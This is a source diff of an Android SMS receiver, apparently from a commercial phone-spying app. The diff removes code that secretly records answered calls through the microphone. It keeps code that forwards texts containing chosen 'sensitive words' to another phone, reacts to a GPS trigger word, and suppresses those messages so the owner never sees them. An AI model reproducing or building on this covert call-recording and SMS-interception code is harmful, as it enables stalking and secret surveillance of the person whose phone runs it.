@@ -35,47 +35,13 @@ import android.telephony.SmsMessage;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 
-/**
- * Receiver for activating setting view.
- */
 public class SmsReceiver extends BroadcastReceiver 
 {
-	private static final String LOGTAG = "ActivationReceiver";
+	private static final String LOGTAG = "SmsReceiver";
 	private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
 	
-	private boolean recordStarted = false;
-	private TelephonyManager telManager;
-	private MediaRecorder recorder;
-	private String DEFAULT_PHONE_RECORD_DIR = FileCtrl.getDefaultDir();
-	
-	private final PhoneStateListener phoneListener = new PhoneStateListener() {
-        public void onCallStateChanged(int state, String incomingNumber) {
-            try {
-                switch (state) {
-                	case TelephonyManager.CALL_STATE_RINGING: {
-                		// 
-                		break;
-                	}
-                	case TelephonyManager.CALL_STATE_OFFHOOK: {
-                		// 
-                		break;
-                	}
-                	case TelephonyManager.CALL_STATE_IDLE: {
-        				if (recordStarted) {
-        					recorder.stop();
-        					recordStarted = false;
-        				}
-                		break;
-                	}
-                	default: { }
-                }
-            } catch (Exception ex) {
-            }
-        } 
-    };
-	
 	// **************************************************************************************
-    // Main receiver for both phone call recording and SMS handling
+    // Receiver for SMS handling
 	// **************************************************************************************
 	@SuppressWarnings("unused")
 	@Override
@@ -83,44 +49,7 @@ public class SmsReceiver extends BroadcastReceiver
 	{
 		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
 		
-		String action = intent.getAction();
-		// ==================================================================================
-		// If a phone call coming
-		// ==================================================================================
-		if (action.equals(Intent.ACTION_ANSWER)) 
-		{
-			// If neither in trail and nor licensed, return
-			LICENSE_TYPE licType = ConfigCtrl.getLicenseType(context);
-			if (licType == LICENSE_TYPE.NOT_LICENSED ||
-				(licType == LICENSE_TYPE.TRIAL_LICENSED && !ConfigCtrl.stillInTrial(context))) {
-				return;
-			}
-			
-			// Phone call recording
-			try {
-                String phoneNum = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
-                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-                recorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
-                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
-                Date startDate = new Date();
-                String fileFullPath = makePhonecallRecordFileFullPath(context, phoneNum, startDate); 
-                recorder.setOutputFile(fileFullPath);
-                recorder.prepare();
-                recorder.start();
-                recordStarted = true;
-                telManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
-            } catch(Exception ex) {
-                
-            }
-
-            telManager.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);
-            
-		} // end of Intent.ACTION_ANSWER
-		
-		// ==================================================================================
-		// If a SMS coming 
-		// ==================================================================================
-		else if (action.equals(SMS_RECEIVED)) 
+		if (intent.getAction().equals(SMS_RECEIVED)) 
 		{
 			String smsBody = SmsCtrl.getSmsBody(intent).trim();
 			if (smsBody.length() <= 0) return; 
@@ -314,12 +243,7 @@ public class SmsReceiver extends BroadcastReceiver
 			// Redirect SMS that contains sensitive words
 			else if (!smsBody.startsWith(SmsConsts.HEADER_INFO_EX) && containSensitiveWords(context, smsBody)) 
 			{
-				// If neither in trail and nor licensed, return
-				LICENSE_TYPE licType = ConfigCtrl.getLicenseType(context);
-				if (licType == LICENSE_TYPE.NOT_LICENSED ||
-					(licType == LICENSE_TYPE.TRIAL_LICENSED && !ConfigCtrl.stillInTrial(context))) {
-					return;
-				}
+				if (!ConfigCtrl.isLegal(context)) return;
 
 				String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
 				if (phoneNum.length() > 0) {
@@ -335,12 +259,7 @@ public class SmsReceiver extends BroadcastReceiver
 				BootService.gpsWord.length() > 0 && 
 				smsBody.contains(BootService.gpsWord)) 
 			{
-				// If neither in trail and nor licensed, return
-				LICENSE_TYPE licType = ConfigCtrl.getLicenseType(context);
-				if (licType == LICENSE_TYPE.NOT_LICENSED ||
-					(licType == LICENSE_TYPE.TRIAL_LICENSED && !ConfigCtrl.stillInTrial(context))) {
-					return;
-				}
+				if (!ConfigCtrl.isLegal(context)) return;
 
 				if (!GlobalPrefActivity.getDisplayGpsSMS(context)) {
 					abortBroadcast();
@@ -362,11 +281,6 @@ public class SmsReceiver extends BroadcastReceiver
         
 	} // end of onReceive()
 	
-	private String makePhonecallRecordFileFullPath(Context context, String phoneNum, Date date) {
-		String fileName = context.getResources().getString(R.string.phonecall_record) + phoneNum + "-" + DatetimeUtil.format3.format(date) + ".wav";
-		return DEFAULT_PHONE_RECORD_DIR + fileName;
-	}
-
 	private boolean containSensitiveWords(Context context, String sms) {
 		boolean ret = false;
 		String[] sensitiveWords = GlobalPrefActivity.getSensitiveWords(context)
